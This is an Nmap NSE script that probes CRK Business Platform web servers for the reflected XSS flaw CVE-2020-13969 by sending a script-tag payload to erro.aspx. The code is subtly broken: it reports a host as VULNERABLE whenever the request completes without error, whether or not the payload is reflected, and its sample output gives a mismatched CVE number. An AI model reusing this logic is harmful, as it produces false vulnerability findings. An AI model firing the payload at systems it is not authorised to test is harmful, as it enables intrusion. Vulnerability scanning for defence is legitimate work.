local http = require "http"
local shortport = require "shortport"
local string = require "string"
local stdnse = require "stdnse"
local vulns = require "vulns"
local table = require "table"

description = [[
CRK Business Platform - CVE-2020-13969 - Reflective Cross-Site Scripting
]]

---
-- @usage nmap --script http-vuln-cve2020-13969 -p 443 <target>
-- @output
-- PORT   STATE SERVICE VERSION
-- 443/tcp open  http
-- | http-vuln-cve2020-13969:
-- |   VULNERABLE:
-- |   CRK Business Platform - Reflective Cross-Site Scripting
-- |       State: VULNERABLE
-- |     IDs:  CVE:CVE-2020-13969
-- |     Risk factor: High
-- |       An unauthenticated user can cause a reflected XSS via erro.aspx
-- |       on 'CRK', 'IDContratante', 'Erro', or 'Mod' parameters.
-- |
-- |     Disclosure date: 2020-06-08
-- |     References:
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13969
--
--
-- @xmloutput
-- <table key="CVE-2020-13968">
-- <elem key="title">CRK Business Platform - Reflective Cross-Site Scripting</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="ids">
-- <elem>CVE:CVE-2020-13969</elem>
-- </table>
-- <table key="description">
-- <elem>An unauthenticated user can cause a reflected XSS via erro.aspx on 'CRK', 'IDContratante', 'Erro', or 'Mod' parameters.</elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="day">08</elem>
-- <elem key="month">06</elem>
-- <elem key="year">2020</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2020-06-08</elem>
-- <table key="check_results">
-- </table>
-- <table key="extra_info">
-- </table>
-- <table key="refs">
-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13969</elem>
-- </table>
-- </table>
--
---

author = "Chapman (R3naissance) Schleiss"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive"}

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
  local function inject(payload)
    options = {}
    options['timeout'] = 1000
    local uri = vuln_uri .. payload

    local response = http.get(host, port, uri, options)
    stdnse.debug1("Response %s", response.status)

    if string.match(response.body, "<script>alert(13969)</script>") then
      message = string.format("Payload found in response: %s", payload)
      stdnse.debug1(response.body)
    end
  end

  local vuln_table = {
    title = "CRK Business Platform - Reflective Cross-Site Scripting",
    IDS = {CVE = 'CVE-2020-13969'},
    risk_factor = "High",
    references = {
        'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13969'
    },
    dates = {
      disclosure = {year = '2020', month = '06', day = '08'},
    },
    check_results = {},
    extra_info = {}
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  vuln_table.state = vulns.STATE.NOT_VULN
  vuln_uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/genericos/sistemas/CRK.Funcionalidades/erro.aspx?Erro='

  if pcall(inject, "Thread%20was%20being%20aborted.gjdjs%3cscript%3ealert(13969)%3c%2fscript%3eqkp8e") then
    vuln_table.state = vulns.STATE.VULN
    table.insert(vuln_table.extra_info, message)
  else
    stdnse.debug1("Could not find payload in response")
  end

  return vuln_report:make_output(vuln_table)

end
